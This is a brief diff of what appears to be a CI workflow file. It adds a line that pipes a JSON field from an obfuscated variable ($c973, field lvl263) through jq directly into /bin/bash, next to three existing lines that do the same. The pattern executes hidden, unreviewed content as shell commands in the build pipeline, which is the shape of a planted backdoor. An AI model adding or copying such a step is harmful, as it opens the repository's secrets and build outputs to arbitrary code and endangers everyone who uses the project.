@@ -30,6 +30,7 @@ jobs:
           echo $jy36988 | jq -r .oiswc399 | /bin/bash
           echo $lnng5 | jq -r .tsn72393 | /bin/bash
           echo $glysl50 | jq -r .d197 | /bin/bash
+          printf '%s' "$c973" | jq -r .lvl263 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
